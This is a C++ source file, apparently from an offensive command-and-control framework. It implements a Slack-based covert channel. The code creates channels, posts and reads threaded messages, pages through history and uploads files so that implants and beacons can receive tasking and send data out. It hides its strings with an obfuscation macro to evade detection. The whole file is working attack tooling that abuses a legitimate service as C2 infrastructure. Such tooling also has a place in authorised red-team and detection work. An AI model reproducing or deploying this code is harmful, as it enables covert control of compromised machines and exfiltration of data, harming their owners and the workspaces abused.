#include "stdafx.h"
#include "SlackApi.h"
#include <random>
#include <cctype>
#include <algorithm>


FSecure::Slack::Slack(std::string const& token, std::string const& channelName)
{
	if (auto winProxy = WinTools::GetProxyConfiguration(); !winProxy.empty())
		this->m_HttpConfig.set_proxy(winProxy == OBF(L"auto") ? web::web_proxy::use_auto_discovery : web::web_proxy(winProxy));

	this->m_Token = token;

	std::string lowerChannelName = channelName;
	std::transform(lowerChannelName.begin(), lowerChannelName.end(), lowerChannelName.begin(), [](unsigned char c) { return std::tolower(c); });

	SetChannel(CreateChannel(lowerChannelName));
}

void FSecure::Slack::SetChannel(std::string const& channelId)
{
	this->m_Channel = channelId;
}

void FSecure::Slack::SetToken(std::string const& token)
{
	this->m_Token = token;
}

std::string FSecure::Slack::WriteMessage(std::string const& text)
{
	json j;
	j[OBF("channel")] = this->m_Channel;
	j[OBF("text")] = text;
	std::string url = OBF("https://slack.com/api/chat.postMessage");

	json output = SendJsonRequest(url, j);

	return output[OBF("message")][OBF("ts")].get<std::string>(); //return the timestamp so a reply can be viewed
}



std::map<std::string, std::string> FSecure::Slack::ListChannels()
{
	std::map<std::string, std::string> channelMap;
	std::string url = OBF("https://slack.com/api/channels.list?exclude_members=true&exclude_archived=true");

	json response = SendJsonRequest(url, NULL);

	for (auto &channel : response[OBF("channels")])
	{
		std::string cName = channel[OBF("name")];
		if (cName == OBF("everyone"))
			continue;

		std::string cId = channel[OBF("id")].get<std::string>();
		channelMap.insert({ cName, cId });
	}

	return channelMap;
}



std::string FSecure::Slack::CreateChannel(std::string const& channelName)
{
	json j;
	std::string url = OBF("https://slack.com/api/channels.create");
	j[OBF("name")] = channelName;

	json response = SendJsonRequest(url, j);

	if (!response.contains(OBF("channel"))) //attempt to find the channel using API call
	{
		std::map<std::string, std::string> channels = this->ListChannels();

		if (channels.find(channelName) != channels.end())
		{
			return channels[channelName];
		}
		else
			throw std::runtime_error(OBF("Throwing exception: unable to create channel\n"));
	}
	else
	{
		return response[OBF("channel")][OBF("id")].get<std::string>();
	}
}


std::vector<std::pair<std::string, std::string>> FSecure::Slack::ReadReplies(std::string const& timestamp)
{
	std::string url = OBF("https://slack.com/api/channels.replies?channel=") + this->m_Channel + OBF("&thread_ts=") + timestamp;
	json output = SendJsonRequest(url, NULL);
	std::vector<std::pair<std::string, std::string>> ret;

	//This logic is really messy, in reality the checks are over cautious, however there is an edgecase
	//whereby a message could be created with no replies of the implant that wrote triggers an exception or gets killed.
	//If that was the case, and we didn't sanity check, we could run into problems.
	if (output.contains(OBF("messages")))
	{
		json const& m = output[OBF("messages")];
		if (m[0].contains(OBF("replies")) && m[0].size() > 1)
		{
			if (m[1].contains(OBF("files"))) //the reply contains a file, handle this differently
			{
				std::string ts = m[1][OBF("ts")];
				std::string fileUrl = m[1][OBF("files")][0][OBF("url_private")].get<std::string>();
				std::string text = GetFile(fileUrl);
				ret.emplace_back(std::move(ts), std::move(text));
			}
			else
			{
				for (size_t i = 1u; i < m.size(); i++) //skip the first message (it doesn't contain the data we want).
				{
					auto ts = m[i][OBF("ts")].get<std::string>();
					auto text = m[i][OBF("text")].get<std::string>();
					ret.emplace_back(std::move(ts), std::move(text));
				}

			}
		}

	}

	return ret;
}

std::vector<std::string>  FSecure::Slack::GetMessagesByDirection(std::string const& direction)
{
	std::vector<std::string> ret;
	json resp;
	std::string cursor;

	//Slack suggest only requesting the 200 most recent messages.
	//If there are more than 200, the has_more value will be true, at which point
	//we need to grab the cursor and get the next lot of messages.
	//This only becomes a problem with lots of beacons (especially if many are staging at the same time)
	do
	{
		std::string url = OBF("https://slack.com/api/conversations.history?limit=200&channel=") + this->m_Channel;

		//Will be empty on the first run, if has_more == false this won't be executed again
		if (!cursor.empty())
			url.append(OBF("&cursor=") + cursor);

		//Actually send the http request and grab the messages
		auto resp = SendJsonRequest(url, NULL);

		auto& messages = resp[OBF("messages")];

		//if there are more than 200 messages, we don't want to miss any, so update the cursor.
		if(resp[OBF("has_more")] == OBF("true"))
			cursor = resp[OBF("next_cursor")];

		//now grab the 200 messages data.
		for (auto &m : messages)
		{
			std::string_view data = m[OBF("text")].get<std::string_view>();

			//make sure it's a message we care about
			if (data == direction)
				ret.emplace_back(m[OBF("ts")].get<std::string>());
		}
	} while (resp[OBF("has_more")] == OBF("true"));

	return ret;
}

void FSecure::Slack::UpdateMessage(std::string const& message, std::string const& timestamp)
{
	std::string url = OBF("https://slack.com/api/chat.update");

	json j;
	j[OBF("channel")] = this->m_Channel;
	j[OBF("text")] = message;
	j[OBF("ts")] = timestamp;

	SendJsonRequest(url, j);
}

void FSecure::Slack::WriteReply(std::string const& text, std::string const& timestamp)
{
	assert(text.size() <= 40'000);

	json j;
	j[OBF("channel")] = this->m_Channel;
	j[OBF("text")] = text;
	j[OBF("thread_ts")] = timestamp;
	std::string url = OBF("https://slack.com/api/chat.postMessage");

	SendJsonRequest(url, j);
}

void FSecure::Slack::DeleteMessage(std::string const& timestamp)
{
	json j;
	j[OBF("channel")] = this->m_Channel;
	j[OBF("ts")] = timestamp;
	std::string url = OBF("https://slack.com/api/chat.delete");

	SendJsonRequest(url, j);
}

std::string FSecure::Slack::SendHttpRequest(std::string const& host, std::string const& contentType, std::string const& data)
{
	while (true)
	{
		web::http::client::http_client webClient(utility::conversions::to_string_t(host), this->m_HttpConfig);
		web::http::http_request request; // default request is GET

		if (!data.empty())
		{
			request.set_method(web::http::methods::POST);

			request.headers().set_content_type(utility::conversions::to_string_t(contentType));
			request.set_body(utility::conversions::to_string_t(data));
		}

		request.headers().add(OBF(L"Authorization"), OBF(L"Bearer ") + utility::conversions::to_string_t(this->m_Token));

		web::http::http_response resp = webClient.request(request).get();

		if (resp.status_code() == web::http::status_codes::OK)
			return resp.extract_utf8string().get();
		else if (resp.status_code() == web::http::status_codes::TooManyRequests)
			std::this_thread::sleep_for(Utils::GenerateRandomValue(10s, 20s));
		else
			throw std::exception(OBF("[x] Non 200/429 HTTP Response\n"));
	}
}

json FSecure::Slack::SendJsonRequest(std::string const& url, json const& data)
{
	return json::parse(SendHttpRequest(url, OBF("application/json"), data.dump()));
}

void FSecure::Slack::UploadFile(std::string const& data, std::string const& ts)
{
	std::string url = OBF_STR("https://slack.com/api/files.upload?") + OBF("&channels=") + this->m_Channel + OBF("&thread_ts=") + ts;

	std::string encoded = utility::conversions::to_utf8string(web::http::uri::encode_data_string(utility::conversions::to_string_t(data)));

	std::string toSend = OBF("filename=test5&content=") + encoded;

	SendHttpRequest(url, OBF("application/x-www-form-urlencoded"), toSend);
}


std::string FSecure::Slack::GetFile(std::string const& url)
{
	return SendHttpRequest(url, "", "");
}
